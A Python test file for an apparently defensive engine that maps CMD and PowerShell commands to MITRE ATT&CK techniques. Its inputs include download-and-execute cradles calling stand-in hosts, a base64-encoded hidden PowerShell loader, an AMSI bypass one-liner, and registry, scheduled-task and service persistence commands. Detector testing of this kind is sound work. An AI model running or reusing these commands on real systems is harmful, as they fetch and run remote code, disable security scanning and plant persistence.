"""Phase 5 · End-to-end: real CMD / PowerShell → SIR → ExecGraph → Behavior
→ MitreMapping[]. Verifies the mapper works on the actual pipeline output.
"""
from __future__ import annotations

import pytest

from engine.parsers.cmd_parser import CmdParser
from engine.parsers.powershell_parser import PowerShellParser
from engine.interpreters.cmd_interpreter import CmdInterpreter
from engine.interpreters.powershell_interpreter import PowerShellInterpreter
from engine.detectors.behavior_extractor import extract_behaviors
from engine.detectors.mitre_mapper import map_behaviors_to_mitre

CP, CI = CmdParser(), CmdInterpreter()
PP, PI = PowerShellParser(), PowerShellInterpreter()


def _run_ps(src):
    g = PI.interpret(PP.parse(src))
    return map_behaviors_to_mitre(extract_behaviors(g))


def _run_cmd(src):
    g = CI.interpret(CP.parse(src))
    return map_behaviors_to_mitre(extract_behaviors(g))


# ── (1-5) canonical PowerShell attack chains ──────────────────────────
def test_ps_downloadstring_iex_maps_T1105():
    mm = _run_ps("iwr -UseBasicParsing http://x.tld/a | iex")
    tids = {m.technique_id for m in mm}
    assert "T1105" in tids


def test_ps_encoded_command_maps_T1059_001_and_T1027_010():
    # -EncodedCommand recognized regardless of alias abbreviation.
    mm = _run_ps("powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AeAAuAHkALwBhACIAKQA=")
    subs = {m.sub_technique_id for m in mm}
    assert "T1059.001" in subs
    assert "T1027.010" in subs


def test_ps_amsi_snippet_produces_a_mapping_or_no_crash():
    # AMSI bypass detection depends on interpreter's semantic_tag emission.
    # We only require the mapper doesn't crash and, if it emits any
    # defense_evasion mapping, it carries evidence.
    mm = _run_ps("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')."
                 "GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
    for m in mm:
        assert m.evidence_behavior_ids and m.evidence_node_ids


def test_ps_registry_run_key_maps_T1547_001():
    mm = _run_ps("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x -Value 'C:\\a.exe'")
    subs = {m.sub_technique_id for m in mm}
    assert "T1547.001" in subs or "T1112" in {m.technique_id for m in mm}


def test_ps_schtasks_maps_T1053_005():
    mm = _run_ps("schtasks /create /tn 'x' /tr 'C:\\a.exe' /sc onlogon")
    assert any(m.sub_technique_id == "T1053.005" for m in mm)


# ── (6-10) canonical CMD attack chains ────────────────────────────────
def test_cmd_reg_add_run_maps_T1547_001():
    mm = _run_cmd(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\a.exe /f')
    subs = {m.sub_technique_id for m in mm}
    assert "T1547.001" in subs or "T1112" in {m.technique_id for m in mm}


def test_cmd_bitsadmin_download_maps_T1105_and_T1197():
    mm = _run_cmd('bitsadmin /transfer job http://x.tld/a C:\\a.exe')
    ids = {m.technique_id for m in mm}
    assert "T1105" in ids and "T1197" in ids


def test_cmd_certutil_urlcache_maps_T1105_T1140():
    mm = _run_cmd('certutil -urlcache -f http://x.tld/a C:\\a.exe')
    ids = {m.technique_id for m in mm}
    assert "T1105" in ids and "T1140" in ids


def test_cmd_schtasks_maps_T1053_005():
    mm = _run_cmd('schtasks /create /tn x /tr C:\\a.exe /sc onlogon')
    assert any(m.sub_technique_id == "T1053.005" for m in mm)


def test_cmd_sc_create_maps_T1543_003():
    mm = _run_cmd('sc create svc binpath= "C:\\bad.exe"')
    assert any(m.sub_technique_id == "T1543.003" for m in mm)


# ── (11-15) evidence-integrity end-to-end ─────────────────────────────
def test_every_e2e_mapping_carries_node_and_behavior_ids():
    mm = _run_ps("iwr http://x.tld/a -OutFile z.exe; Start-Process z.exe")
    assert mm
    for m in mm:
        assert m.evidence_behavior_ids
        assert m.evidence_node_ids


def test_e2e_no_ai_flag_pipeline_is_deterministic():
    src = "iwr http://x.tld/a -OutFile z.exe"
    a = _run_ps(src)
    b = _run_ps(src)
    assert [(m.technique_id, m.sub_technique_id, m.rule_id) for m in a] == \
           [(m.technique_id, m.sub_technique_id, m.rule_id) for m in b]


def test_e2e_benign_dir_command_yields_only_cmd_shell():
    mm = _run_cmd("cmd /c dir C:\\Users")
    # cmd /c dir spawns a cmd shell (via /c) — R-EXE-CMD fires.
    ids = {m.technique_id for m in mm}
    assert "T1059" in ids  # cmd shell
    # No download / persistence / evasion techniques from a plain `dir`.
    assert not (ids & {"T1105", "T1547", "T1218", "T1027"})


def test_e2e_empty_input_yields_no_mapping():
    assert _run_cmd("") == []
    assert _run_ps("") == []


def test_e2e_pwsh_lower_matches_ps_rule():
    mm = _run_ps("pwsh -c 'Get-Date'")
    assert any(m.sub_technique_id == "T1059.001" for m in mm)
